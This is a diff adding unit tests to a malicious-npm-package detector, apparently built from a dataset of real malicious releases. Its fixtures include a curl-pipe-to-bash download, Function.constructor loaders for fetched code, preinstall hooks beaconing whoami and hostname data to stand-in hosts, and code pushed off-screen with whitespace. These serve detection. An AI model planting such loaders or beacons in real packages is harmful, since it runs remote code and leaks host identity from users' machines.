@@ -485,6 +485,49 @@ class JSPhases(unittest.TestCase):
         self.assertEqual(got, set())
 
 
+class NpmGaps(unittest.TestCase):
+    """Forms seen in malicious npm releases the analysis used to miss (Datadog dataset, 2026-11). Each is a general
+    language form, not one package: a sink reached another way, a file the package runs itself, a value carried in
+    shell variables, code moved out of sight."""
+
+    def test_constructor_of_a_global_function_is_function(self):
+        for expr in ("new Function.constructor('require', s)", "Function.constructor('require', s)",
+                     "atob.constructor('require', s)", "new (Object.constructor)('require', s)"):
+            got = js_code("const a = require('axios');\n(async () => {\n"
+                          "  const s = (await a.get('https://x.example/p')).data.c;\n"
+                          f"  ({expr})(require);\n}})();\n")
+            self.assertIn(("download_exec", "import"), got, expr)
+
+    def test_file_the_package_spawns_counts_as_loaded(self):
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        main = ("const path = require('path'), { spawn } = require('child_process');\n"
+                "spawn('node', [path.resolve(__dirname, './lib/caller.js')], {detached: true, stdio: 'ignore'}).unref();\n")
+        self.assertIn(("download_exec", "import"), js_facts({"index.js": main, "lib/caller.js": src}))
+        joined = "require('child_process').fork(require('path').join(__dirname, 'lib', 'w.js'));\n"
+        self.assertIn(("download_exec", "import"), js_facts({"index.js": joined, "lib/w.js": src}))
+        self.assertIn(("download_exec", "call"), js_facts({"index.js": "module.exports = 1;\n", "lib/caller.js": src}))
+
+    def test_identity_carried_through_shell_variables(self):
+        ctx = behavior.Context()
+        ctx.shell("u=$(whoami) && for i in \"$u\"; do e=$(echo -n \"$i\" | xxd -p) && curl \"http://$e.dns.example/\"; done",
+                  "install", "package.json#preinstall", 1)
+        self.assertIn("sysinfo_beacon", {f for f, *_ in ctx.facts})
+        ctx = behavior.Context()
+        ctx.shell("curl --data \"ip=$(sh -c 'hostname -I | awk {print}')\" https://hook.example/x", "install", "p", 1)
+        self.assertIn("sysinfo_beacon", {f for f, *_ in ctx.facts})
+        for normal in ("V=$(node -v); curl https://x.example/?v=$V", "cd $(dirname $0) && make", "u=$(whoami); echo hi $u",
+                       "echo \"$(id -un | tr a b)\" && echo done"):
+            ctx = behavior.Context()
+            ctx.shell(normal, "install", "p", 1)
+            self.assertEqual(set(ctx.facts), set(), normal)
+
+    def test_code_hidden_off_screen(self):
+        got = js_code("module.exports = {};" + " " * 400 + "global['r'] = require; (function(){ var a = 1; })();\n")
+        self.assertIn(("hidden_code", "import"), got)
+        self.assertNotIn(("hidden_code", "import"), js_code("var t = '" + " " * 400 + "x';\nmodule.exports = t;\n"))
+        self.assertNotIn(("hidden_code", "import"), js_code("!function(){var a=1;return a}();var b=2;" * 300 + "\n"))
+
+
 class JSNormal(unittest.TestCase):
     def test_sdk_sends_its_key_to_its_api(self):
         got = js_code("const key = process.env.OPENAI_API_KEY;\n"
